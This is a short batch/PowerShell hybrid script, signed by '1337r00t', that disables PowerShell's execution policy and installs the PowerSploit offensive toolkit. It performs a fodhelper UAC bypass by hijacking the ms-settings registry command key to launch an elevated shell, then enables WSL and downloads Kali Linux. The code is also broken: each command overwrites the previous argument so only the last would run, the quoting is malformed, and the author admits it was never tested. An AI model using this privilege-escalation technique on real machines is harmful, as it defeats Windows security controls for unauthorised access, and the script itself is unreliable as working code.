<#  :cmd header for PowerShell script
@   set dir=%~dp0
@   set ps1="%TMP%\%~n0-%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%.ps1"
@   copy /b /y "%~f0" %ps1% >nul
@   powershell -NoProfile -ExecutionPolicy Bypass -File %ps1% %*
@   del /f %ps1%
@   goto :eof
#>

$ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessInfo.FileName = "powershell.exe"
	$ProcessInfo.RedirectStandardError = $true
	$ProcessInfo.RedirectStandardOutput = $true
	$ProcessInfo.UseShellExecute = $false
 	$ProcessInfo.Arguments = "Find-Module -Name PowerShellGet | Install-Module"
    $ProcessInfo.Arguments = "Find-Module -Name PowerSploit | Install-Module"
	$ProcessInfo.Arguments = "Invoke-Expression -Command 'echo Coded By 1337r00t Sorry i Am not testing this tool'"
	$ProcessInfo.Arguments = "New-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force"
	$ProcessInfo.Arguments = "New-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecute' -Value "" -Force"
	$ProcessInfo.Arguments = "Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(default)' -Value 'cmd /K powershell.exe' -Force"
	$ProcessInfo.Arguments = "Start-Process 'C:\Windows\System32\fodhelper.exe' -WindowStyle Hidden"
    $ProcessInfo.Arguments = "Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux"
    $ProcessInfo.Arguments = "Invoke-WebRequest -Uri https://aka.ms/wsl-kali-linux-new -OutFile Kali.appx -UseBasicParsing"
	$Process = New-Object System.Diagnostics.Process
	$Process.StartInfo = $ProcessInfo
	$Process.Start() | Out-Null
	$Process.WaitForExit()
	$output = $Process.StandardOutput.ReadToEnd()
	$output